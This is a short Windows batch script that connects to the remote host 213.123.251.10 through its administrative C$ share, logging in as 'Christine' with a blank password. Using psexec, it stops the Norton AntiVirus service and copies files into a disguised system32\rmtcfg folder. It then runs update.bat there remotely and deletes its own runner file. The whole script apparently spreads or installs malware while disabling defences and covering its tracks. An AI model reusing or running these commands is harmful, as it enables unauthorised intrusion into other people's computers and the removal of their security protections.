net use v: /delete
net use \\213.123.251.10 /USER:Christine
net use v: \\213.123.251.10\C$
psexec \\213.123.251.10 -u Christine -p "" net stop "Norton AntiVirus Server"
psexec \\213.123.251.10 -u Christine -p "" -c temp.bat
mkdir v:\winnt\system32\rmtcfg
mkdir v:\winnt\system32\catroot
copy copy\* v:\winnt\system32\rmtcfg
mkdir v:\winnt\system32\rmtcfg\files
mkdir v:\winnt\system32\rmtcfg\files\copy
mkdir v:\winnt\system32\rmtcfg\files\dat
mkdir v:\winnt\system32\rmtcfg\files\log
mkdir v:\winnt\system32\rmtcfg\files\plugin
copy C:\WINNT\SYSTEM32\RMTCFG\files\* v:\winnt\system32\rmtcfg\files
copy copy\* v:\winnt\system32\rmtcfg\files\copy
copy plugin\* v:\winnt\system32\rmtcfg\files\plugin
copy dat\* v:\winnt\system32\rmtcfg\files\dat
psexec \\213.123.251.10 -u Christine -p "" -d c:\winnt\system32\rmtcfg\update.bat
net use v: /delete
net use \\213.123.251.10 /delete
del runme338656.bat
